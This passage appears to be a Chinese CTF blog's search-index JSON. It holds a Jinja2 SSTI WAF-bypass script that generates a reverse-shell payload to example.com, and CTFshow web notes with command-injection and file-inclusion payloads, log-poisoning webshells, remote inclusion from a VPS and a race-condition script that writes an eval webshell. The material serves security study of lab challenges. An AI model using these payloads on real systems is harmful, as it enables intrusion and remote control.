[{"title":"Hello World","url":"/2024/03/28/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n"},{"title":"amateursctf2024字体文件分析","url":"/2024/04/07/amateursctf2024%E5%AD%97%E4%BD%93%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90/","content":"最近做了一下amateursctf的题，其中有一个字体分析的题，从来没做过，一开始拿fontforge打开的这个文件，有点问题，没看出啥，后面看了学长怎么做的，在这里记录一下。\n主要就是有两个字体分析的网页\nhttps://chinese-font.netlify.app/online-split/\nhttps://chinese-font.netlify.app/analyze/\n因为一开始拿到的是.otf后缀的文件，放到第一个网站上分析得到一个包，里面又有一个.woff2的文件，放在第二个网站上分析，就能找到flag了\n","categories":["CTF"],"tags":["web"]},{"title":"jinja2_SSTI全自动绕waf脚本","url":"/2024/04/05/jinja2-SSTI%E5%85%A8%E8%87%AA%E5%8A%A8%E7%BB%95waf%E8%84%9A%E6%9C%AC/","content":"根据WAF函数生成shell指令对应的payloadfrom fenjing import exec_cmd_payload, config_payloadimport logginglogging.basicConfig(level = logging.INFO)def waf(s: str): # 如果字符串s可以通过waf则返回True, 否则返回False    blacklist = [        &quot;config&quot;, &quot;self&quot;, &quot;g&quot;, &quot;os&quot;, &quot;class&quot;, &quot;length&quot;, &quot;mro&quot;, &quot;base&quot;, &quot;lipsum&quot;,        &quot;[&quot;, &#x27;&quot;&#x27;, &quot;&#x27;&quot;, &quot;_&quot;, &quot;.&quot;, &quot;+&quot;, &quot;~&quot;, &quot;&#123;&#123;&quot;,        &quot;0&quot;, &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;, &quot;7&quot;, &quot;8&quot;, &quot;9&quot;,        &quot;０&quot;,&quot;１&quot;,&quot;２&quot;,&quot;３&quot;,&quot;４&quot;,&quot;５&quot;,&quot;６&quot;,&quot;７&quot;,&quot;８&quot;,&quot;９&quot;    ]    return all(word not in s for word in blacklist)if __name__ == &quot;__main__&quot;:    shell_payload, _ = exec_cmd_payload(waf, &quot;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/example.com/3456 0&gt;&amp;1\\&quot;&quot;)    # config_payload = config_payload(waf)    print(f&quot;&#123;shell_payload=&#125;&quot;)    # print(f&quot;&#123;config_payload=&#125;&quot;)\n\n在不获取WAF黑名单的情况下，根据返回页面中的特征生成payload比如说如果提交的payload被WAF后，WAF页面含有”BAD”这三个字母，那么可以这么写：\nimport functoolsimport timeimport requestsfrom fenjing import exec_cmd_payloadURL = &quot;http://10.137.0.28:5000&quot;@functools.lru_cache(1000)def waf(payload: str):  # 如果字符串s可以通过waf则返回True, 否则返回False    time.sleep(0.02) # 防止请求发送过多    resp = requests.get(URL, timeout=10, params=&#123;&quot;name&quot;: payload&#125;)    return &quot;BAD&quot; not in resp.textif __name__ == &quot;__main__&quot;:    shell_payload, will_print = exec_cmd_payload(        waf, &#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/example.com/3456 0&gt;&amp;1&quot;&#x27;    )    if not will_print:        print(&quot;这个payload不会产生回显！&quot;)    print(f&quot;&#123;shell_payload=&#125;&quot;)\n\n详情请参考https://github.com/Marven11/Fenjing\n","categories":["CTF"],"tags":["SSTI"]},{"title":"CTFshow web入门笔记","url":"/2024/05/08/ctfshow1/","content":"CTFshow笔记1查看源码\n\n2\n3抓包，flag在响应里面\n\n29传入c参数，不能含flag，可以用通配符绕过，eval函数将字符串当作php代码执行,所以用system(‘cat *lag.php’)\n\n30过滤了system，flag和php，直接passthru(‘cat fl*’);\n\n31过滤了”cat sort shell”以及，点，空格，单引号\n1.由于只对参数c进行了过滤，所以可以获取其他参数，c&#x3D;eval($_GET[1]);&amp;1&#x3D;system(“cat fl*”)\n\n\n\nc=show_source(next(array_reverse(scandir(pos(localeconv())))));localeconv()：返回包含本地化数字和货币格式信息的关联数组。这里主要是返回数组第一个&quot;.&quot;pos():输出数组第一个元素，不改变指针；scandir();遍历目录，这里因为参数为&quot;.&quot;所以遍历当前目录array_reverse():元组倒置next():将数组指针指向下一个，这里其实可以省略倒置和改变数组指针，直接利用[2]取出数组也可以show_source():查看源码\n\n3.%09，{$IFS},$IFS$9 绕过空格\n\n32文件包含 日志注入过滤掉了flag|system|php|cat|sort|shell|.| |’|&#96;|echo|;|( 包括点，单引号，反引号，分号，括号再像前几关一样直接输入命令执行不大可能了，因为括号，分号，反引号都被过滤掉了，但是php中也有不需要括号的函数，如：echo 123;print 123;die;include “&#x2F;etc&#x2F;passwd”;require “&#x2F;etc&#x2F;passwd”;include_once “&#x2F;etc&#x2F;passwd”;require_once “etc&#x2F;passwd”;这里我们利用include构造payloadurl&#x2F;?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php其中?&gt;代替分号，页面会显示flag.php内容的base64编码，解码即可获取flag还有一种方法，日志注入url&#x2F;?c&#x3D;include$_GET[1]?%3E&amp;1&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log是nginx默认的access日志路径，访问该路径时，在User-Agent中写入一句话木马，然后用中国蚁剑连接即可\n\n37\n39?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,?&gt;为php结束符号，后面拼接的.php会被忽略掉，不用管\n\n40无参数RCE\n法一c&#x3D;eval(array_pop(next(get_defined_vars())));&#x2F;&#x2F;需要POST传入参数为1&#x3D;system(‘tac fl*’);\nget_defined_vars() 返回一个包含所有已定义变量的多维数组。这些变量包括环境变量、服务器变量和用户定义的变量，例如GET、POST、FILE等等。\nnext()将内部指针指向数组中的下一个元素，并输出。\narray_pop() 函数删除数组中的最后一个元素并返回其值。\n法二c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv()))))); 或者 c&#x3D;show_source(next(array_reverse(scandir(getcwd()))));\ngetcwd() 函数返回当前工作目录。它可以代替pos(localeconv())\nlocaleconv()：返回包含本地化数字和货币格式信息的关联数组。这里主要是返回值为数组且第一项为”.”\npos():输出数组第一个元素，不改变指针；\ncurrent() 函数返回数组中的当前元素（单元）,默认取第一个值，和pos()一样\nscandir() 函数返回指定目录中的文件和目录的数组。这里因为参数为”.”所以遍历当前目录\narray_reverse():数组逆置\nnext():将数组指针指向下一个，这里其实可以省略倒置和改变数组指针，直接利用[2]取出数组也可以\nshow_source():查看源码\npos() 函数返回数组中的当前元素的值。该函数是current()函数的别名。\n每个数组中都有一个内部的指针指向它的”当前”元素，初始指向插入到数组中的第一个元素。\n提示：该函数不会移动数组内部指针。\n相关的方法：\ncurrent()返回数组中的当前元素的值。\nend()将内部指针指向数组中的最后一个元素，并输出。\nnext()将内部指针指向数组中的下一个元素，并输出。\nprev()将内部指针指向数组中的上一个元素，并输出。\nreset()将内部指针指向数组中的第一个元素，并输出。\neach()返回当前元素的键名和键值，并将内部指针向前移动。\n\n41异或绕过\n//xor.php&lt;?php$myfile = fopen(&quot;xor_rce.txt&quot;, &quot;w&quot;);$contents=&quot;&quot;;for ($i=0; $i &lt; 256; $i++) &#123; \tfor ($j=0; $j &lt;256 ; $j++) &#123; \t\tif($i&lt;16)&#123;\t\t\t$hex_i=&#x27;0&#x27;.dechex($i);\t\t&#125;\t\telse&#123;\t\t\t$hex_i=dechex($i);\t\t&#125;\t\tif($j&lt;16)&#123;\t\t\t$hex_j=&#x27;0&#x27;.dechex($j);\t\t&#125;\t\telse&#123;\t\t\t$hex_j=dechex($j);\t\t&#125;\t\t$preg = &#x27;/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\&#123;|\\&#125;|\\&amp;|\\-/i&#x27;;\t\tif(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;\t\t\t\t\techo &quot;&quot;;    &#125;  \t\telse&#123;\t\t$a=&#x27;%&#x27;.$hex_i;\t\t$b=&#x27;%&#x27;.$hex_j;\t\t$c=(urldecode($a)|urldecode($b));\t\tif (ord($c)&gt;=32&amp;ord($c)&lt;=126) &#123;\t\t\t$contents=$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\\n&quot;;\t\t&#125;\t&#125;&#125;&#125;fwrite($myfile,$contents);fclose($myfile);\n\n#python xor.py# -*- coding: utf-8 -*-import requestsimport urllibfrom sys import *import osos.system(&quot;php xor.php&quot;)  #没有将php写入环境变量需手动运行if(len(argv)!=2):   print(&quot;=&quot;*50)   print(&#x27;USER：python exp.py &lt;url&gt;&#x27;)   print(&quot;eg：  python exp.py http://ctf.show/&quot;)   print(&quot;=&quot;*50)   exit(0)url=argv[1]def action(arg):   s1=&quot;&quot;   s2=&quot;&quot;   for i in arg:       f=open(&quot;xor_rce.txt&quot;,&quot;r&quot;)       while True:           t=f.readline()           if t==&quot;&quot;:               break           if t[0]==i:               #print(i)               s1+=t[2:5]               s2+=t[6:9]               break       f.close()   output=&quot;(\\&quot;&quot;+s1+&quot;\\&quot;|\\&quot;&quot;+s2+&quot;\\&quot;)&quot;   return(output)   while True:   param=action(input(&quot;\\n[+] your function:&quot;) )+action(input(&quot;[+] your command:&quot;))   data=&#123;       &#x27;c&#x27;:urllib.parse.unquote(param)       &#125;   r=requests.post(url,data=data)   print(&quot;\\n[*] result:\\n&quot;+r.text)\n\n\n42if(isset($_GET[&#x27;c&#x27;]))&#123;    $c=$_GET[&#x27;c&#x27;];    system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);&#125;else&#123;    highlight_file(__FILE__);\n\n\n&#x2F;dev&#x2F;null 2&gt;&amp;1 意思是将标准输出和标准错误都重定向到 &#x2F;dev&#x2F;null 即不回显#重定向至&#x2F;dev&#x2F;null即丢弃; &#x2F;&#x2F;分号| &#x2F;&#x2F;只执行后面那条命令|| &#x2F;&#x2F;只执行前面那条命令&amp; &#x2F;&#x2F;两条命令都会执行&amp;&amp; &#x2F;&#x2F;两条命令都会执行\n\n可构造playload:url&#x2F;?c&#x3D;tac flag.php||url&#x2F;?c&#x3D;tac flag.php%26注意，这里的&amp;需要url编码\n\n43比42题多过滤了cat和分号，那就用tac和||，不过||要url编码成%7C%7C\n也可以用\\绕过\n\n44多过滤flag，通配符绕过?c&#x3D;tac f*%7C%7Cls\n\n45多过滤了空格，用$IFS$9或%09（table制表符）或%5C（反斜杠）绕过\n\n46‘&#x2F;;|cat|flag| |[0-9]|\\$|*&#x2F;i’\n?c&#x3D;tac%09fla?.php%7C%7Cls\n\n47?c&#x3D;uniq%09fla?.php%7C%7Cls\nuniq nl tac都可以\n\n48\n56import timeimport requestsurl = &quot;http://7c7374da-7245-4232-8215-59ae33ec2825.challenge.ctf.show/&quot;payload = &#123;&quot;c&quot;:&quot;. /???/????????[@-[]&quot;&#125;with open(&#x27;.\\\\1.txt&#x27;,&#x27;r&#x27;) as file:    files = &#123;&#x27;file&#x27;: file&#125;    while 1:        r = requests.post(url,params=payload,files=files)        if r.text:            print(&quot;\\n&quot; + r.text)            break        time.sleep(1)        print(&quot;.&quot;, end=&#x27; &#x27;,flush=True)\n\n//1.txtcat flag.php\n\n\n57通过$(())操作构造出36： $(()) ：代表做一次运算，因为里面为空，也表示值为0\n$(( ~$(()) )) ：对0作取反运算，值为-1\n$(( $((~$(()))) $((~$(()))) ))： -1-1，也就是(-1)+(-1)为-2，所以值为-2\n$(( ~$(( $((~$(()))) $((~$(()))) )) )) ：再对-2做一次取反得到1，所以值为1\n故我们在$(( ~$(( )) ))里面放37个$((~$(())))，得到-37，取反即可得到36:\npython脚本\nget_reverse_number = &quot;$((~$((&#123;&#125;))))&quot; # 取反操作negative_one = &quot;$((~$(())))&quot;\t\t# -1payload = get_reverse_number.format(negative_one*37)print(payload)\n\n~x&#x3D;-x-1\n~100&#x3D;-100-1\n首先看等号左边(100) 的二进制表示为: 0110 0100 按位取反的意思就是每一位取反，0变1，1变0所以: ~100 的二进制表示为：1001 1011 所以等号左边&#x3D;1001 1011\n再看右边-101. 一旦看到出现负数，那么这个数一定是按有符号数的规则来表示的。一个二进制数 按位取反并加一以后就可以得到它自己的负数的补码，也就是说： ~x+1&#x3D;-x 所以，我们把101按位取反加一 先取反：~101&#x3D;10011010 再加一： ~101+1&#x3D;10011011&#x3D;-101 所以等号右边&#x3D;10011011&#x3D;左边，所以等号成立。\n双小括号 (( )) 是 Bash Shell 中专门用来进行整数运算的命令，它的效率很高，写法灵活，是企业运维中常用的运算命令。 通俗地讲，就是将数学运算表达式放在((和))之间。 表达式可以只有一个，也可以有多个，多个表达式之间以逗号,分隔。对于多个表达式的情况，以最后一个表达式的值作为整个 (( ))命令的执行结果。 可以使用$获取 (( )) 命令的结果，这和使用$获得变量值是类似的。 可以在 (( )) 前面加上$符号获取 (( )) 命令的执行结果，也即获取整个表达式的值。以 c&#x3D;$((a+b)) 为例，即将 a+b 这个表达式的运算结果赋值给变量 c。 注意，类似 c&#x3D;((a+b)) 这样的写法是错误的，不加$就不能取得表达式的结果。\n\n58各种命令执行的函数都用不了\n先c&#x3D;print_r(scandir(getcwd()));查看当前目录下的文件(也可以pos(localeconv()))替换getcwd())\n两种解法POST传参：c&#x3D;highlight_file(“flag.php”);(**show_source()和file_get_contents()**也行)POST传参：c&#x3D;include($_POST[‘w’]);&amp;w&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php\n\n59同上\n\n60同上\n\n61\n66发现flag不在当前目录里面的flag.php里\nprint_r(scandir(‘&#x2F;‘));看一下根目录，发现flag.txt\n直接highlight_file(‘&#x2F;flag.txt’);\n\n67不能用print_r了，就用var_dump\n\n68同样flag在&#x2F;flag.txt\n不能用highlight_file()和file_get_contents()\n那就文件包含\nc&#x3D;include($_POST[1]);&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag.txt\nvar_dump((new SplFileObject(“flag.txt”))-&gt;fpassthru());\n\n69不能用var_dump()了\n可以用**debug_zval_dump()和var_export()**替代\nprint和echo无法打印数组，也可以利用implode函数将数组转换成字符串再打印\necho(implode(‘—‘,scandir(‘&#x2F;‘)));\nimplode()第一个参数为分隔符\n也可以用json_encode()\nc&#x3D;echo json_encode(scandir(‘&#x2F;‘));\n读取函数readgzfile：可以读取非gz格式的文件\n\n71提前送出缓冲区或终止程序\n$s = ob_get_contents();ob_end_clean();echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);\n\n源码劫持了输出缓冲并且将数字和字母替换成了?。\n法一在劫持输出缓冲区之前就把缓冲区送出，可以用的函数有：\nob_flush();ob_end_flush();\n\npayload示例：\nc=include(&#x27;/flag.txt&#x27;);ob_flush();\n\n法二提前终止程序，即执行完代码直接退出，可以调用的函数有：\nexit();die();\n\npayload示例：\nc=include(&#x27;/flag.txt&#x27;);exit();\n\n\n72发现\nvar_export(scandir(&#x27;.&#x27;));die();  #可以正常读取var_export(scandir(&#x27;/&#x27;));die();   #读取失败\n\n\n猜测是开启了open_basedir。\nopen_basedir可将用户访问文件的活动范围限制在指定的区域，通常是其家目录的路径。\n所以要先绕过open_basedir。首先排除命令执行绕过的可能，disable_function已经禁用了命令执行函数（不知道有没有什么办法绕过）。可以使用glob伪协议绕过，glob伪协议筛选目录不受open_basedir的制约。\nDirectoryIterator+glob:&#x2F;&#x2F;c=?&gt;&lt;?php$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#x27; &#x27;);&#125; exit(0);?&gt;\n\n(需要url编码)\nscandir()+glob:&#x2F;&#x2F;&lt;?phpvar_dump(scandir(&#x27;glob:///*&#x27;));&gt;\n\nopendir()+readdir()+glob:&#x2F;&#x2F;&lt;?phpif ( $b = opendir(&#x27;glob:///*&#x27;) ) &#123;    while ( ($file = readdir($b)) !== false ) &#123;        echo $file.&quot;&lt;br&gt;&quot;;    &#125;    closedir($b);&#125;?&gt;\n\n同理，这种方法也只能列出根目录和open_basedir允许目录下的文件。可以看到，上面三种和glob:&#x2F;&#x2F;相关的协议，最大的缺陷就是只能列目录，而且还只能列根目录和open_basedir允许目录的内容。\n\n参考：https://forum.butian.net/share/533\n\n73同71\n\n74禁用了scandir()函数，用glob()函数\nc&#x3D;var_export(glob(‘..&#x2F;..&#x2F;..&#x2F;*’));die();\nc&#x3D;include(‘&#x2F;flagx.txt’);die();\n\n75又设置了open_basedir的限制，先用global协议读取根目录的文件，发现flag36.txt，尝试用uaf去读取该文件，发现不能用strlen函数，此处就用mysql连接，用load_file()函数读取\ntry &#123;\t# 创建 PDO 实例, 连接 MySQL 数据库\t$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;, &#x27;root&#x27;);#在不知道数据库名的情况下可以用information_schema代替\t\t# 在 MySQL 中，load_file(完整路径) 函数读取一个文件并将其内容作为字符串返回。\tforeach($dbh-&gt;query(&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;) as $row) &#123;\t\techo($row[0]).&quot;|&quot;;\t&#125;\t\t$dbh = null;&#125;catch (PDOException $e) &#123;\techo $e-&gt;getMessage();exit(0);&#125;exit(0);\n\n来看看ai对上面代码的解释\n这段代码是一个PHP脚本，其目的是通过PDO（PHP Data Objects）扩展连接到MySQL数据库，并尝试使用load_file()函数读取服务器上的一个名为flag36.txt的文件，然后将文件内容输出。下面是代码的逐行解释：\n\ntry &#123;...&#125; 开始一个异常处理块，用于捕获可能发生的任何异常。\n\n$dbh = new PDO(&#39;mysql:host=localhost;dbname=ctftraining&#39;, &#39;root&#39;, &#39;root&#39;); 创建一个新的PDO实例，用于连接到名为ctftraining的MySQL数据库。这里假设数据库服务器运行在本地主机上，数据库用户名和密码都是root。\n\nforeach($dbh-&gt;query(&#39;select load_file(&quot;/flag36.txt&quot;)&#39;) as $row) &#123; ... &#125; 执行一个SQL查询，使用load_file()函数尝试读取服务器上的/flag36.txt文件。foreach循环遍历查询结果，每次迭代获取一行。\n\necho($row[0]).&quot;|&quot;; 输出当前行的第一个字段（即文件内容），后面跟着一个竖线符号|。\n\n$dbh = null; 关闭数据库连接。\n\ncatch (PDOException $e) &#123; ... &#125; 捕获并处理PDOException类型的异常。如果连接数据库或执行查询时出现错误，将输出错误信息并退出脚本。\n\necho $e-&gt;getMessage();exit(0); 输出异常的错误信息，并退出脚本。\n\nexit(0); 无论是否发生异常，脚本都会正常结束。\n\n\n需要注意的是，load_file()函数只能读取数据库服务器所在机器上的文件，而且出于安全考虑，这个函数可能需要相应的权限，并且可能在某些配置中被禁用。此外，尝试读取服务器上的文件可能涉及到安全风险，尤其是当文件路径和名称来自用户输入时，这可能导致服务器文件泄露或其他安全问题。\n如果你正在尝试解决一个CTF（Capture The Flag，一种网络安全竞赛）挑战，那么这段代码可能是挑战的一部分，你需要确保你有权访问目标服务器，并且你的行为符合所有相关的法律和道德标准。如果你是服务器管理员，并且这段代码是未经授权的，那么你需要考虑服务器的安全配置，避免潜在的安全风险。\n\n76和75一样，先用global协议找出flag36d.txt,后面用mysql连接\n\n77尝试沿用web75和76的思路，使用PDO连接MySQL数据库，然后使用load_file函数绕过文件读取的限制，读取flag，但是报 could not find driver的错误，表明此题无法使用PDO连接数据库。查看writeup，此题利用的是PHP 7.4+的FFI特性，即外部函数接口特性，相关文档请查看PHP手册，这里我主要是对payload信息进行简单分析。\n原文链接：https://blog.csdn.net/weixin_44700621/article/details/125381763\n$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);//创建一个system对象$a=&#x27;/readflag &gt; 1.txt&#x27;;//没有回显的$ffi-&gt;system($a);//通过$ffi去调用system函数\n\n此处无法直接cat &#x2F;flag36x.txt,猜测应该是权限不够，而&#x2F;readflag应该是一个可执行文件\n打开1.txt\n\n78直接用data:&#x2F;&#x2F;协议\nfile&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(‘ls’);&gt;\n发现flag.php\nfile&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(‘cat flag.php’);&gt;\n\n79法一?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?&#x3D;system(‘cat flag*’);?\n也可以base64编码\n?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs&#x3D;PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs &#x3D;&#x3D;&#x3D;&gt; &lt;?php system(‘cat flag.php’);\n法二payload: POST /?file=Php://input HTTP/1.1&lt;?Php system(&quot;ls&quot;);?&gt;POST /?file=Php://input HTTP/1.1&lt;?Php system(&quot;cat flag.php&quot;);?&gt;# 仅需在请求行 大写即可\n\n法三远程加载 加载robots.txt，发现可以回显 http://e382a8ae-a28f-4acd-9b8a-dbbd55f9a843.challenge.ctf.show/?file=https://www.baidu.com/robots.txt 在自己vps上创建1.txt，内容如下 &lt;?php system(&quot;tac flag.php&quot;);?&gt; 起一个http服务，加载 http://e382a8ae-a28f-4acd-9b8a-dbbd55f9a843.challenge.ctf.show/?file=http://8.x.x.x:7001/1.txt\n\n80法一同79，\npayload: POST /?file=Php://input HTTP/1.1&lt;?Php system(&quot;ls&quot;);?&gt;POST /?file=Php://input HTTP/1.1&lt;?Php system(&quot;cat flag.php&quot;);?&gt;# 仅需在请求行 大写即可\n\n\n\n法二远程加载 加载robots.txt，发现可以回显 http://e382a8ae-a28f-4acd-9b8a-dbbd55f9a843.challenge.ctf.show/?file=https://www.baidu.com/robots.txt 在自己vps上创建1.txt，内容如下 &lt;?php system(&quot;tac flag.php&quot;);?&gt; 起一个http服务，加载 http://e382a8ae-a28f-4acd-9b8a-dbbd55f9a843.challenge.ctf.show/?file=http://8.x.x.x:7001/1.txt\n法三日志文件包含\n日志文件中包含了 url以及ua信息等，这里ua最容易控制，抓包改ua，写入一句话即可。如下第三行\nGET /?file=/var/log/nginx/access.log HTTP/1.1Host: 4e9bb3c0-1021-427e-81a3-42e5e6e13c39.challenge.ctf.showUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0&lt;?php eval($_GET[2]);?&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateDNT: 1Cookie: UM_distinctid=17ffcdc88eb73a-022664ffe42c5b8-13676d4a-1fa400-17ffcdc88ec82cConnection: close\n\n可以直接命令执行即可也可以用webshell后门工具连接\n?file=/var/log/nginx/access.log&amp;2=system(&#x27;ls /var/www/html&#x27;);phpinfo();?file=/var/log/nginx/access.log&amp;2=system(&#x27;tac /var/www/html/fl0g.php&#x27;);phpinfo();\n\n寻找PHPinfo信息前面的那一段信息即可找到\n\n81日志文件包含\n\n82session文件包含（条件竞争）\nimport requestsimport ioimport threading  url = &quot;https://1f1cda6a-c896-4c19-a6d4-8d1cef1fb977.challenge.ctf.show/&quot;session_id = &quot;guli&quot;  def write(session):   filebytes = io.BytesIO(b&#x27;a&#x27; * 1024 * 50)   while True:       res = session.post(url,           data=&#123;               &#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &quot;&lt;?php eval($_POST[2]);?&gt;&quot;              &#125;,           cookies=&#123;               &#x27;PHPSESSID&#x27;: session_id              &#125;,           files=&#123;               &#x27;file&#x27;: (&#x27;hhh.jpg&#x27;, filebytes)              &#125;          )  def read(session):   while True:       res = session.post(url+&quot;?file=/tmp/sess_&quot;+session_id,                          data=&#123;                              &quot;2&quot;:&quot;file_put_contents(&#x27;/var/www/html/guli.php&#x27; , &#x27;&lt;?php eval($_POST[3]);?&gt;&#x27;);&quot;                                                        &#125;,                          cookies=&#123;                              &quot;PHPSESSID&quot;:session_id                          &#125;                          )       res2 = session.get(&quot;https://1f1cda6a-c896-4c19-a6d4-8d1cef1fb977.challenge.ctf.show/guli.php&quot;)       if res2.status_code == 200:           print(&quot;成功写入一句话！&quot;)       else:           print(&quot;Retry&quot;)      if __name__ == &quot;__main__&quot;:   evnet = threading.Event()   with requests.session() as session:       for i in range(5):           threading.Thread(target=write, args=(session,)).start()       for i in range(5):           threading.Thread(target=read, args=(session,)).start()   evnet.set()\n\n元旦水友赛第一题也是此考点\n参考：https://www.freebuf.com/vuls/202819.html\n\n87if(isset($_GET[&#x27;file&#x27;]))&#123;    $file = $_GET[&#x27;file&#x27;];    $content = $_POST[&#x27;content&#x27;];    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);    file_put_contents(urldecode($file), &quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;.$content);    &#125;else&#123;    highlight_file(__FILE__);&#125;\n\nfile_put_contents函数将数据写入文件，这里的file参数使用了url解码函数，所以我们需要url编码两次，且是全字符url编码，以便绕过对特殊字符的过滤，后面content参数拼接了,这里我们可以采用base64解码写入数据，所以需要将数据先base64编码，PD9waHAgQGV2YWwoJF9QT1NUW2FdKTs&#x2F;Pg&#x3D;&#x3D;（），由于base64解码需要四字节一组，并且只会识别字母与几个特定字符，于是前面就只多了phpdie6个字符，所以需要添加两个字符来凑成八字符，即content&#x3D;aaPD9waHAgQGV2YWwoJF9QT1NUW2FdKTs&#x2F;Pg&#x3D;&#x3D;\n88if(isset($_GET[&#x27;file&#x27;]))&#123;    $file = $_GET[&#x27;file&#x27;];    if(preg_match(&quot;/php|\\~|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\-|\\_|\\+|\\=|\\./i&quot;, $file))&#123;        die(&quot;error&quot;);    &#125;    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125;\n\n用data:&#x2F;&#x2F;协议，这里用base64编码，由于过滤了+号和&#x3D;号，我们要使base64编码后的字符串不含+和&#x3D;，只需在?&gt;加一些字符补位即可\n?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgQGV2YWwoJF9QT1NUW2FdKTs&#x2F;PmFh\n89include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if(preg_match(&quot;/[0-9]/&quot;, $num))&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num))&#123;        echo $flag;    &#125;\n\npreg_match当检测的变量是数组的时候会报错并返回0。而intval函数当传入的变量也是数组的时候，会返回1\n90include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if($num===&quot;4476&quot;)&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)===4476)&#123;        echo $flag;    &#125;else&#123;        echo intval($num,0);    &#125;&#125;\n\nintval(mixed $value, int $base &#x3D; 10)\n通过使用指定的进制 base 转换（默认是十进制），返回变量 value 的 int数值。\n如果 base 是 0，通过检测 value 的格式来决定使用的进制：\n\n如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，\n如果字符串以 “0b” (或 “0B”) 开头，使用 2 进制 (binary)；否则，\n如果字符串以 “0” 开始，使用 8 进制(octal)；否则，\n将使用 10 进制 (decimal)。\n\n这里base为0，我们可以用二进制八进制十六进制\nnum=0b1000101111100\\\\二进制num=010574\\\\八进制num=0x117c\\\\十六进制num=4476.1\n\n\n\n91show_source(__FILE__);include(&#x27;flag.php&#x27;);$a=$_GET[&#x27;cmd&#x27;];if(preg_match(&#x27;/^php$/im&#x27;, $a))&#123;    if(preg_match(&#x27;/^php$/i&#x27;, $a))&#123;        echo &#x27;hacker&#x27;;    &#125;    else&#123;        echo $flag;    &#125;&#125;else&#123;    echo &#x27;nonononono&#x27;;&#125;\n\n\n\n问题在于，这两个检查使用了不同的正则表达式匹配模式。第一个使用了’&#x2F;im’，这意味着i（忽略大小写）和m（多行模式）。第二个只使用了’i’，也就是忽略大小写。\n用换行符就好\nurl?cmd&#x3D;%0aphp\n92include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if($num==4476)&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)==4476)&#123;        echo $flag;    &#125;else&#123;        echo intval($num,0);    &#125;&#125;\n\n90题的方法依旧可以\n93过滤了字符\n八进制或浮点型\n94include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123;    $num = $_GET[&#x27;num&#x27;];    if($num===&quot;4476&quot;)&#123;        die(&quot;no no no!&quot;);    &#125;    if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123;        die(&quot;no no no!&quot;);    &#125;    if(!strpos($num, &quot;0&quot;))&#123;        die(&quot;no no no!&quot;);    &#125;    if(intval($num,0)===4476)&#123;        echo $flag;    &#125;&#125;\n\nstrpos($num, 